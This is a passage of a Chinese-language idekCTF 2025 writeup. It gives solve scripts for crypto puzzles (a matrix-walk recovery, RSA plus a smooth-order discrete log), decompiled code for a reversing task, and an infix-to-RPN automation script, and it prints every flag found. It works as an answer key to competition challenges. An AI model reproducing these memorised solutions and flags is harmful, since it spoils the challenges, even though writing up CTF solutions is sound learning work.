F_p (p=limit),    compute its inverse, apply it to &#x27;endpoint&#x27;, and collect those previous points    whose coordinates are both strictly less than the corresponding coordinates of endpoint.    Returns a list of tuples: (index, prev_x, prev_y).    &quot;&quot;&quot;    x_n, y_n = endpoint    candidates = []    for i in range(125):        part = mind[i * 8:(i + 1) * 8]        e0 = int.from_bytes(part[0:2], &quot;big&quot;) % limit        e1 = int.from_bytes(part[2:4], &quot;big&quot;) % limit        e2 = int.from_bytes(part[4:6], &quot;big&quot;) % limit        e3 = int.from_bytes(part[6:8], &quot;big&quot;) % limit        det = (e0 * e3 - e1 * e2) % limit        if det == 0:            continue        det_inv = pow(det, -1, limit)        inv_a = (e3 * det_inv) % limit        inv_b = (-e1 * det_inv) % limit        inv_c = (-e2 * det_inv) % limit        inv_d = (e0 * det_inv) % limit        prev_x = (inv_a * x_n + inv_b * y_n) % limit        prev_y = (inv_c * x_n + inv_d * y_n) % limit        if prev_x &lt; x_n and prev_y &lt; y_n:            candidates.append((i, prev_x, prev_y))    return candidatesdef recover_mind_sequence(        mind: bytes,        start: Tuple[int, int],        end: Tuple[int, int],        limit: int,        steps: int = 30) -&gt; List[bytes]:    &quot;&quot;&quot;    Reverse-engineer the sequence of &#x27;parts&#x27; used by the cat to move from &#x27;start&#x27; to &#x27;end&#x27;.    Returns the list of 8-byte parts in forward order.    &quot;&quot;&quot;    current = end    seq_indices = []    seq_coords = []    for step in range(steps):        candidates = find_candidate_prev_points(mind, current, limit)        if len(candidates) != 1:            raise ValueError(f&quot;Step &#123;step + 1&#125;: expected 1 candidate, found &#123;len(candidates)&#125;&quot;)        idx, prev_x, prev_y = candidates[0]        seq_indices.append(idx)        seq_coords.append((prev_x, prev_y))        current = (prev_x, prev_y)    # Verify we reached the start coordinate    if current != start:        raise ValueError(f&quot;After reverse (&#123;steps&#125; steps), reached &#123;current&#125;, expected start &#123;start&#125;&quot;)    # Reverse indices to forward order and extract parts    seq_indices.reverse()    recovered_parts = [mind[i * 8:(i + 1) * 8] for i in seq_indices]    return recovered_partsdef simulate_walking_sequence(        start: Tuple[int, int],        parts: List[bytes]) -&gt; Tuple[int, int]:    &quot;&quot;&quot;    Simulate the cat&#x27;s walking forward using the recovered parts to verify correctness.    &quot;&quot;&quot;    x, y = start    for part in parts:        # parse matrix        e0 = int.from_bytes(part[0:2], &quot;big&quot;)        e1 = int.from_bytes(part[2:4], &quot;big&quot;)        e2 = int.from_bytes(part[4:6], &quot;big&quot;)        e3 = int.from_bytes(part[6:8], &quot;big&quot;)        xx = e0 * x + e1 * y        yy = e2 * x + e3 * y        x, y = xx, yy    return (x, y)if __name__ == &quot;__main__&quot;:    import os    from pwn import *    conn = remote(&#x27;catch.chal.idek.team&#x27;, 1337)    for iter in range(20):        conn.recvuntil(b&#x27;Co-location: &#x27;)        x0, y0 = literal_eval(conn.recvline().decode())        #print(x0, y0)        conn.recvuntil(b&#x27;Cat\\&#x27;s hidden mind: &#x27;)        mind_hex = conn.recvline().decode()        mind = bytes.fromhex(mind_hex)        conn.recvuntil(b&#x27;Cat now at: &#x27;)        xn, yn = literal_eval(conn.recvline().decode())        limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f        conn.recvuntil(b&#x27;Path to recall (hex):&#x27;)        parts = recover_mind_sequence(mind, (x0, y0), (xn, yn), limit)        print(&quot;Recovered sequence of indices and parts:&quot;)        sendpart = &#x27;&#x27;.join(part.hex() for part in parts)        print(sendpart)        # Verify forward simulation        simulated_end = simulate_walking_sequence((x0, y0), parts)        #print(&quot;Simulated end:&quot;, simulated_end)        #print(&quot;Original end: &quot;, (xn, yn))        if simulated_end == (xn, yn):            print(&quot;Verification passed!&quot;)        else:            print(&quot;Verification failed.&quot;)        conn.sendline(sendpart.encode())    conn.interactive()#idek&#123;Catch_and_cat_sound_really_similar_haha&#125;#By the way, 这个limit换成其他的大质数也可以过关，只要比x_30和y_30大就可以了。\ndiamond ticket题目如下。\nfrom Crypto.Util.number import *#Some magic from Willy Wonkap = 170829625398370252501980763763988409583a = 164164878498114882034745803752027154293b = 125172356708896457197207880391835698381def chocolate_generator(m:int) -&gt; int:    return (pow(a, m, p) + pow(b, m, p)) % p#The diamond ticket is hiding inside chocolatediamond_ticket = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()assert len(diamond_ticket) == 26assert diamond_ticket[:5] == b&quot;idek&#123;&quot;assert diamond_ticket[-1:] == b&quot;&#125;&quot;diamond_ticket = bytes_to_long(diamond_ticket[5:-1])flag_chocolate = chocolate_generator(diamond_ticket)chocolate_bag = []#Willy Wonka are making chocolatesfor i in range(1337):    chocolate_bag.append(getRandomRange(1, p))#And he put the golden ticket at the endchocolate_bag.append(flag_chocolate)#Augustus ate lots of chocolates, but he can&#x27;t eat all cuz he is full now :Dremain = chocolate_bag[-5:]#Compress all remain chocolates into oneremain_bytes = b&quot;&quot;.join([c.to_bytes(p.bit_length()//8, &quot;big&quot;) for c in remain])#The last chocolate is too important, so Willy Wonka did magic againP = getPrime(512)Q = getPrime(512)N = P * Qe = bytes_to_long(b&quot;idek&#123;this_is_a_fake_flag_lolol&#125;&quot;)d = pow(e, -1, (P - 1) * (Q - 1))c1 = pow(bytes_to_long(remain_bytes), e, N)c2 = pow(bytes_to_long(remain_bytes), 2, N) # A small gift#How can you get it ?print(f&quot;&#123;N = &#125;&quot;)print(f&quot;&#123;c1 = &#125;&quot;)print(f&quot;&#123;c2 = &#125;&quot;) &quot;&quot;&quot;N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649&quot;&quot;&quot;\n一道充满着“特别”的题目，每一个数据都是精心给出的。拿到题目，先读一下巧克力工厂的故事，flag开头和结尾共6 bytes已给出，中间20 bytes未知。列表chocolate_bag加入了1337个1~p的随机数，又加入了 $(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p$ 的值——看起来又是一个离散对数，而且不是普通的离散对数。生成结束后，remain仅包含最后5个数，所幸包含flag信息的项是最后一项，它保留了下来。将这5项转化为16*5=80 bytes的字节串并拼接，最后是一个RSA加密。因此，如果没有意外，我们的大致逻辑应该是 解密RSA -&gt; 提取flag_chocolate -&gt; 还原diamond_ticket 。这样做也确实能够得到答案。\n第1步：解密RSA已知$m^e\\ \\text{mod}\\ N$和$m^2\\ \\text{mod}\\ N$，且 $m$ 是一个80*8=640bit的数， $m^2$ 也有1280位，爆破高256位不现实。由于e是一个247位的奇数，$\\text{gcd}(e,2) = 1$，我们用 $m^2$ 和 $m^e$ 凑出 $m^1$ 。可以构造 $m^1 = m^{1\\ast e-\\frac{e-1}{2}\\ast 2} = m^e \\ast  (m^2)^{-\\frac{e-1}{2}}$ ，模 $N$ 下运算得到 $m$ 。\n第2步：提取flag_chocolate我们只要最后一项，故提取最后16个byte，咱图省事就全部一起提取了，并输出chunks的最后一个元素。\n第3步：还原diamond_ticket此时我们拥有等式$(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p = c$ ，已知a, b, c, p，求flag。在咨询了Deepseek等AI并通过代码验证后，我们发现了给定的a, b, p有一些有趣的性质——$p$ 是一个质数，但 $p-1 = 2 × 40841 × 50119 × 51193 × 55823 × 57809 × 61991 × 63097 × 64577$ ，是很多小素数之积（ $p-1$ 是光滑数）。$a$ 和 $b$ 的阶均为 $\\frac{p-1}{2}$ ，且 $b = a^{73331}\\ \\text{mod}\\ p$因此，对于问题$(a^\\text{flag}+b^\\text{flag})\\text{mod}\\ p = c$，将其转化为$((a^\\text{flag}+(a^\\text{flag})^{73331}) - c )\\ \\text{mod}\\ p = 0$，即寻找$f(x) = x^{73331}+x-c$ 的一个根$x_0$。一旦找到这个根，它就是 $a^\\text{flag}$ ，转化为普通的离散对数，再利用Pohlig-Hellman算法，求得阶为光滑数的离散对数。使用cypari库对该函数进行求根，相比sage的roots()函数，它快得多，只需要十多秒就能得到答案。再利用sage自带的discrete_log()函数求解即可得到flag。\n……真的吗？将求出的 x = 4807895356063327854843653048517090061 转换成bytes后不都是可打印字符，说明我们还有路没走完，但是 assert chocolate_generator(x) == c 也通过了，说明我们确实找到了正确的一个x。求一下x的位数，它有122位，而diamond_ticket有20*8=160位。由于 $a$, $b$ 的阶相等，故$a^\\frac{p-1}{2}\\ \\text{mod}\\ p = b^\\frac{p-1}{2}\\ \\text{mod}\\ p = 1$，因此除了 $x$ 以外，所有 $x+k\\ast \\frac{p-1}{2}$ 也都是可能的diamond_ticket，$k$ 为正整数。对于该取什么 $k$ 没有好的办法，一共20 bytes（160位），最高位的byte最多是0x7E(01111110)，故diamond_ticket最多有159位；最少是0x20(00100000)，diamond_ticket最少也有158位。根据 $\\text{diamond_ticket} = x+k\\ast \\frac{p-1}{2}$ 可知 $k$ 至少为31位，最多为32位，我们遍历k in range(2**31, 2**33)即可。由于数据过大，采用多线程并行加速，实测本机32线程约20分钟。以及，我的多线程写得一团糟，把起点修改为 $2^{31}$ 就给不出结果，所以代码是从 $0$ 遍历到 $2^{33}$ ，多花了约$\\frac{1}{4}$的时间。\n######################################################pythonfrom Crypto.Util.number import *N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649e = 186211850710224327090212578283834164039515361235211653610924153794366237821# 已知量：N, e, c1, c2# 计算 temp = (e-1)//2temp = (e - 1) // 2# 先算 t = c2^temp mod Nt = pow(c2, temp, N)# 再算 t 的模反元素 inv_t = t^&#123;-1&#125; mod Ninv_t = inverse(t, N)# 最后 m = c1 * inv_t mod Nm = (c1 * inv_t) % Nassert pow(m,e,N) == c1assert pow(m,2,N) == c2# 将整数 m 转成字节串remain_bytes = long_to_bytes(m)print(remain_bytes)#b&#x27;&#123;\\xd1\\xdf\\xeb|F\\xce\\xbc\\x11\\xd8nZ\\x8b\\xfc\\xaebN\\xf4\\x8a&#123;0,\\x01\\xb7\\xf9\\xe7\\xb5q\\xc93%\\xba\\x0b\\x15\\x94g\\x0b|\\xd8 \\xf38\\xf2\\xe2#\\t\\x0ci^\\x10\\x86\\x94\\x12\\xcb\\xe7b/\\xefj\\xb5\\x05\\xfb\\xc8\\xf9J\\xebU|z\\x10\\xd3|\\xa7\\xec\\xd1\\x9d\\x17\\\\P\\xb3&#x27;#其中\\\\表示一个反斜杠，算一个byte#Some magic from Willy Wonkap = 170829625398370252501980763763988409583a = 164164878498114882034745803752027154293b = 125172356708896457197207880391835698381L = p.bit_length() // 8   # =128//8 =16chunks = [remain_bytes[i*L:(i+1)*L] for i in range(5)]print(bytes_to_long(chunks[-1]))#99584795316725433978492646071734128819######################################################sagedef chocolate_generator(m:int) -&gt; int:    return (pow(a, m, p) + pow(b, m, p)) % pc = 99584795316725433978492646071734128819import cypari2pari = cypari2.Pari()def roots_mod_p_via_pari(k, c, p):    y = pari(&#x27;y&#x27;)    f = y**k + y - c    return list(map(int, pari(f).polrootsmod(p)))k = 73331roots = roots_mod_p_via_pari(k, c, p)print(&quot;roots:&quot;, roots)#[126961729658296101306560858021273501485]a = 164164878498114882034745803752027154293for y in roots:    # 把 a, y 视为 GF(p) 中的元素    F = GF(p)    A = F(a)    Y = F(y)    # 调用 discrete_log    x = discrete_log(Y, A)    assert chocolate_generator(x) == c    print(&quot;解得 x =&quot;, x)#4807895356063327854843653048517090061######################################################pythondef is_all_printable(bs: bytes) -&gt; bool:    return all(0x20 &lt;= b &lt;= 0x7E for b in bs)import multiprocessing# 上一部分结果BASE = 4807895356063327854843653048517090061from tqdm import tqdmimport os# 子任务：在给定区间内查找满足条件的 jdef worker(start: int, end: int, queue):    results = []    for j in range(start, end):        val = BASE + (p-1)//2 * j        text = long_to_bytes(val)        if is_all_printable(text):            results.append((j, text))        if j % 10000 == 0:            queue.put(10000)    return resultsif __name__ == &#x27;__main__&#x27;:    multiprocessing.set_start_method(&#x27;spawn&#x27;)  # For compatibility, especially on Windows    cpu_count = multiprocessing.cpu_count()    total = 2**33    chunk = total // cpu_count    # 使用 Manager 和 Queue 跟踪进度    with multiprocessing.Manager() as manager:        queue = manager.Queue()        pool = multiprocessing.Pool(processes=cpu_count)        # 用 tqdm 显示总进度        with tqdm(total=total, desc=&quot;Brute-forcing&quot;, unit=&quot;j&quot;) as pbar:            results = []            tasks = []            for i in range(cpu_count):                start = i * chunk                end = start + chunk if i &lt; cpu_count - 1 else total                tasks.append(pool.apply_async(worker, (start, end, queue)))            # 实时更新进度条            finished = 0            while finished &lt; total:                inc = queue.get()                pbar.update(inc)                finished += inc            # 等待所有任务完成并收集结果            pool.close()            pool.join()            for task in tasks:                for j, text in task.get():                    print(f&quot;Found j=&#123;j&#125;: &#123;text&#125;&quot;)                    #Found j=7781310273: b&#x27;tks_f0r_ur_t1ck3t_xD&#x27;#idek&#123;tks_f0r_ur_t1ck3t_xD&#125;\nREconstruction附件是一个elf程序，试验得知，当没有参数时，输出👀，有参数时，输出Wrong! ，搜索字符串发现：\n.rodata:0000000000403013 aCorrect        db &#x27;Correct!&#x27;,0         ; DATA XREF: sub_401050:loc_401159↑o.rodata:000000000040301C aWrong          db &#x27;Wrong!&#x27;,0           ; DATA XREF: sub_401050+CE↑o\n推测主函数是sub_401050，找到该函数：\nunsigned __int64 __fastcall sub_401050(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)&#123;  __int64 v6; // rcx  unsigned __int64 i; // rax  int v8; // edx  __int64 v9; // rdx  int v10; // eax  unsigned int v11; // ebp  signed __int64 v12; // r12  unsigned __int8 *v13; // rax  unsigned __int64 result; // rax  char v15[24]; // [rsp+0h] [rbp-1038h] BYREF  unsigned __int64 v16; // [rsp+1008h] [rbp-30h]  LODWORD(v6) = 0;  v16 = __readfsqword(0x28u);  for ( i = 0; i != 42; ++i )  &#123;    v8 = v6 ^ (unsigned __int8)::a3[i];    v6 += 31;    v9 = (i &gt;&gt; 1) ^ v8 ^ 0x5A;    byte_405140[i] = v9;  &#125;  byte_40516A = 0;  v10 = sub_401670((__int64)&quot;/proc/self/cmdline&quot;, 0, v9, v6, a5, a6, v15[0]);  v11 = v10;  if ( v10 &gt;= 0 )  &#123;    v12 = sub_401A10((unsigned int)v10, v15, 4095);    sub_4019C0(v11);    if ( v12 &gt; 0 )    &#123;      v15[v12] = 0;      v13 = sub_401830(v15, 0, v12);      if ( v13 )      &#123;        if ( v13 + 1 &lt; (unsigned __int8 *)&amp;v15[v12] )        &#123;          if ( (unsigned int)sub_401910(v13 + 1, byte_405140) )            sub_401770(&quot;Wrong!&quot;);          else            sub_401770(&quot;Correct!&quot;);          sub_401010(0);        &#125;      &#125;    &#125;  &#125;  result = v16 - __readfsqword(0x28u);  if ( result )    sub_401610();  return result;&#125;\n因此，正确答案的生成过程是\nLODWORD(v6) = 0;for ( i = 0; i != 42; ++i )&#123;  v8 = v6 ^ (unsigned __int8)::a3[i];  v6 += 31;  v9 = (i &gt;&gt; 1) ^ v8 ^ 0x5A;  byte_405140[i] = v9;&#125;\n分析它太麻烦了，直接动态调试到这个位置，提取byte_405140如下。\n.bss:0000000000405140 ; _BYTE byte_405140[42].bss:0000000000405140 byte_405140 db 69h, 64h, 65h, 6Bh, 7Bh, 68h, 65h, 34h, 72h, 64h, 5Fh, 30h, 66h, 5Fh.bss:0000000000405140                                         ; DATA XREF: sub_401050+1C↑o.bss:000000000040514E db 63h, 6Fh, 6Eh, 73h, 74h, 72h, 75h, 63h, 74h, 6Fh, 72h, 73h, 3Fh, 5Fh.bss:000000000040515C db 6Eh, 6Fh, 77h, 5Fh, 79h, 6Fh, 75h, 5Fh, 64h, 31h, 64h, 21h, 21h, 7Dh.bss:000000000040516A byte_40516A db 0                        ; DATA XREF: sub_401050+6C↑w\n续上后面的byte_40516A = 0;，直接可以在IDA中整合成字符串：\n.bss:0000000000405140 aIdekHe4rd0fCon db &#x27;idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;&#x27;,0.bss:0000000000405140                                         ; DATA XREF: sub_401050+1C↑o\n于是我们已经找到了——idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;\n但是这太快了，于是水一下wp（×）\n对输入的判定过程是\nif ( (unsigned int)sub_401910(v13 + 1, byte_405140) )  sub_401770(&quot;Wrong!&quot;);else  sub_401770(&quot;Correct!&quot;);\n中间就是截取输入的过程\nv10 = sub_401670((__int64)&quot;/proc/self/cmdline&quot;, 0, v9, v6, a5, a6, v15[0]);v11 = v10;if ( v10 &gt;= 0 )&#123;  v12 = sub_401A10((unsigned int)v10, v15, 4095);  sub_4019C0(v11);  if ( v12 &gt; 0 )  &#123;    v15[v12] = 0;    v13 = sub_401830(v15, 0, v12);    ...\n判定输入的函数 sub_401910 是\n__int64 __fastcall sub_401910(unsigned __int8 *a1, unsigned __int8 *a2)&#123;  unsigned __int8 v2; // dl  int v3; // ecx  __int64 v4; // rax  v2 = *a1;  v3 = *a2;  v4 = 1;  if ( *a1 != (_BYTE)v3 )    return (unsigned int)v2 - v3;  while ( v2 )  &#123;    v2 = a1[v4++];    v3 = a2[v4 - 1];    if ( v2 != (_BYTE)v3 )      return (unsigned int)v2 - v3;  &#125;  return (unsigned int)-v3;&#125;\n其要求 *a1 和 *a2 每一位都要相等，如果有不等的位，则返回他们的差值；如果v3更长，则返回v2结束后的第一个v3的位。由于我们已知作为字符串末尾的byte_40516A是0，因此唯一能让这个判定返回0的方法是，输入的长度与v13相等，且每一位都一样，这样返回的就是字符串末尾的0。\n因此，根据前面的提取数据过程，最后应该输入idek&#123;he4rd_0f_constructors?_now_you_d1d!!&#125;，这就是flag。\nMiscGacha gate题目如下。\n#!/usr/bin/env python3import contextlibimport osimport randomimport reimport signalimport sysfrom z3 import ArithRef, BitVec, BitVecRef, BitVecVal, Solver, simplify, unsatWIDTH = 32OPS = [&#x27;~&#x27;, &#x27;&amp;&#x27;, &#x27;^&#x27;, &#x27;|&#x27;]MAX_DEPTH = 10FLAG = os.getenv(&#x27;FLAG&#x27;, &#x27;idek&#123;fake_flag&#125;&#x27;)VARS = set(&#x27;iIl&#x27;)def rnd_const() -&gt; tuple[str, BitVecRef]:    v = random.getrandbits(WIDTH)    return str(v), BitVecVal(v, WIDTH)def rnd_var() -&gt; tuple[str, BitVecRef]:    name = &#x27;&#x27;.join(random.choices(tuple(VARS), k=10))    return name, BitVec(name, WIDTH)def combine(    op: str,    left: tuple[str, BitVecRef],    right: tuple[str, BitVecRef] | None = None,) -&gt; tuple[str, ArithRef]:    if op == &#x27;~&#x27;:        s_left, z_left = left        return f&#x27;(~&#123;s_left&#125;)&#x27;, ~z_left    s_l, z_l = left    s_r, z_r = right    return f&#x27;(&#123;s_l&#125; &#123;op&#125; &#123;s_r&#125;)&#x27;, &#123;        &#x27;&amp;&#x27;: z_l &amp; z_r,        &#x27;^&#x27;: z_l ^ z_r,        &#x27;|&#x27;: z_l | z_r,    &#125;[op]def random_expr(depth: int = 0) -&gt; tuple[str, ArithRef]:    if depth &gt;= MAX_DEPTH or random.random() &lt; 0.1:        return random.choice((rnd_var, rnd_const))()    op = random.choice(OPS)    if op == &#x27;~&#x27;:        return combine(op, random_expr(depth + 1))    return combine(op, random_expr(depth + 1), random_expr(depth + 1))TOKEN_RE = re.compile(r&#x27;[0-9]+|[iIl]+|[~&amp;^|]&#x27;)def parse_rpn(s: str) -&gt; ArithRef:    tokens = TOKEN_RE.findall(s)    if not tokens:        raise ValueError(&#x27;empty input&#x27;)    var_cache: dict[str, BitVecRef] = &#123;&#125;    stack: list[BitVecRef] = []    for t in tokens:        if t.isdigit():            stack.append(BitVecVal(int(t), WIDTH))        elif re.fullmatch(r&#x27;[iIl]+&#x27;, t):            if t not in var_cache:                var_cache[t] = BitVec(t, WIDTH)            stack.append(var_cache[t])        elif t in OPS:            if t == &#x27;~&#x27;:                if len(stack) &lt; 1:                    raise ValueError(&#x27;stack underflow&#x27;)                a = stack.pop()                stack.append(~a)            else:                if len(stack) &lt; 2:                    raise ValueError(&#x27;stack underflow&#x27;)                b = stack.pop()                a = stack.pop()                stack.append(&#123;&#x27;&amp;&#x27;: a &amp; b, &#x27;^&#x27;: a ^ b, &#x27;|&#x27;: a | b&#125;[t])        else:            raise ValueError(f&#x27;bad token &#123;t&#125;&#x27;)    if len(stack) != 1:        raise ValueError(&#x27;malformed expression&#x27;)    return stack[0]def equivalent(e1: ArithRef, e2: ArithRef) -&gt; tuple[bool, Solver]:    s = Solver()    s.set(timeout=5000)    s.add(simplify(e1) != simplify(e2))    return s.check() == unsat, sdef _timeout_handler(_: int, __) -&gt; None:    raise TimeoutErrordef main() -&gt; None:    signal.signal(signal.SIGALRM, _timeout_handler)    print(&#x27;lets play a game!&#x27;)    for _ in range(50):        random.seed()        expr_str, expr_z3 = random_expr()        print(expr_str, flush=True)        signal.alarm(5)        try:            line = sys.stdin.readline()            signal.alarm(0)        except TimeoutError:            print(&#x27;too slow!&#x27;)            return        try:            rpn_z3 = parse_rpn(line.strip())        except Exception as e:            print(&#x27;invalid input:&#x27;, e)            return        print(&#x27;let me see..&#x27;)        is_eq, s = equivalent(expr_z3, rpn_z3)        if not is_eq:            print(&#x27;wrong!&#x27;)            with contextlib.suppress(BaseException):                print(&#x27;counter example:&#x27;, s.model())            return    print(FLAG)if __name__ == &#x27;__main__&#x27;:    main()\n咱倒是没想到一个misc题居然这么好心，完成了任务就真的给你flag。\n这题目像是给大学生准备的（笑）题目给出一个中缀表达式，要求给出它对应的后缀表达式，并检验是否等效，规定时间内通过50次检验就能得到flag。中缀转后缀，只要学过数据结构或者算法的都应该能写出来，再不济让ChatGPT写，它很擅长做这种大学课后习题对于一个表达式 &#39;((~((~1925064568) ^ (~(~(348138675 &amp; IIiIlIillI))))) &amp; (~(~(((iIllIIIIII &amp; 648807684) | (4074926542 | iIilIIIiiI)) | (iiiiIIliIl ^ (203353170 ^ 3427631998))))))&#39;，转成后缀表达式(RPN)需要先划词为&#39;(&#39;, &#39;~&#39;, &#39;1925064568&#39;等token，借助一个栈，将符号按照优先级移到操作数的后面，由于本题生成的表达式均有括号包裹，可以避免^&amp;|~这四种符号的优先级问题。对于括号，每当遇到&#39;)&#39;时，就从栈内弹出符号直到匹配&#39;(&#39;，这两者中间的表达式就可以直接移动符号。上述表达式转换后为 &#39;1925064568 ~ 348138675 IIiIlIillI &amp; ~ ~ ^ ~ iIllIIIIII 648807684 &amp; 4074926542 iIilIIIiiI | | iiiiIIliIl 203353170 3427631998 ^ ^ | ~ ~ &amp;&#39; 。signal.alarm(5)表示5秒后进入超时处理部分，本题只是简单抛出TimeoutError，经由main函数捕获后告知&#39;too slow!&#39;，手动计算并复制到命令行不易且容易出错，交由pwntool库自动交互完成。使用recvline()接收一行，recvuntil()接收直到指定的字节串，sendline()发送一行字节串。注意所有发送和接收到的都是字节，可以使用decode()方法变为字符串。交互不难！使用合适的方法，获取关键信息，加以处理，再传回去~\nfrom pwn import *import re# 用于将输入字符串切分成 tokenTOKEN_RE = re.compile(r&#x27;([0-9]+|[iIl]+|[~&amp;^|]|\\(|\\))&#x27;)def tokenize(expr: str) -&gt; list[str]:    &quot;&quot;&quot;    将中缀表达式字符串拆分成 token 列表。    支持：      - 十进制整数，如 1234      - 由 i, I, l 构成的变量名，如 iiIIlI      - 单字符运算符 ~ &amp; ^ |      - 括号 ( )    &quot;&quot;&quot;    tokens = TOKEN_RE.findall(expr)    if &#x27;&#x27;.join(tokens) != expr.strip().replace(&#x27; &#x27;, &#x27;&#x27;):        raise ValueError(&quot;非法字符或格式错误&quot;)    return tokensdef infix_to_rpn(expr: str) -&gt; str:    &quot;&quot;&quot;    将中缀表达式 expr 转成逆波兰表达式，    返回一个以空格分隔的 RPN 字符串。    &quot;&quot;&quot;    tokens = tokenize(expr)    # 运算符优先级    prec = &#123;&#x27;~&#x27;: 4, &#x27;&amp;&#x27;: 3, &#x27;^&#x27;: 2, &#x27;|&#x27;: 1&#125;    # 一元运算符 ~ 右结合，二元运算符左结合    right_assoc = &#123;&#x27;~&#x27;&#125;    output: list[str] = []    ops: list[str] = []    for t in tokens:        if re.fullmatch(r&#x27;\\d+|[iIl]+&#x27;, t):            # 数字或变量            output.append(t)        elif t in prec:            # 运算符            while ops and ops[-1] in prec:                top = ops[-1]                if (prec[top] &gt; prec[t] or                        (prec[top] == prec[t] and t not in right_assoc)):                    output.append(ops.pop())                else:                    break            ops.append(t)        elif t == &#x27;(&#x27;:            ops.append(t)        elif t == &#x27;)&#x27;:            # 弹出直到左括号            while ops and ops[-1] != &#x27;(&#x27;:                output.append(ops.pop())            if not ops or ops[-1] != &#x27;(&#x27;:                raise ValueError(&quot;括号不匹配&quot;)            ops.pop()  # 丢弃 &#x27;(&#x27;        else:            raise ValueError(f&quot;未知 token: &#123;t&#125;&quot;)    # 最后把剩余运算符都弹出    while ops:        if ops[-1] in (&#x27;(&#x27;, &#x27;)&#x27;):            raise ValueError(&quot;括号不匹配&quot;)        output.append(ops.pop())    return &#x27; &#x27;.join(output)conn = remote(&#x27;gacha-gate.chal.idek.team&#x27;, 1337)context.log_level = &#x27;debug&#x27;conn.recvuntil(b&#x27;lets play a game!\\n&#x27;)for i in range(50):    expression = conn.recvline().decode()    #print(f&#x27;expression: &#123;expression&#125;&#x27;)    ans = infix_to_rpn(expression)    conn.sendline(ans.encode())    conn.recvuntil(b&#x27;let me see..\\n&#x27;)conn.interactive()\n后记太弱啦太弱啦！crypto和re双修的我根本做不出来几道呢，我很想看看那几道椭圆曲线的题目是如何解的，一点思路都没有，以及那个5美元外包的vm，虽然已经有一些进展了（指看到了输入 i 可以调出寄存器），但是后面的工程似乎还很大，猪脑过载了喵&gt;_&lt;\n等大手子师傅的wp（躺\n","categories":["笔记"],"tags":["Writeup","2025","idekCTF"]}]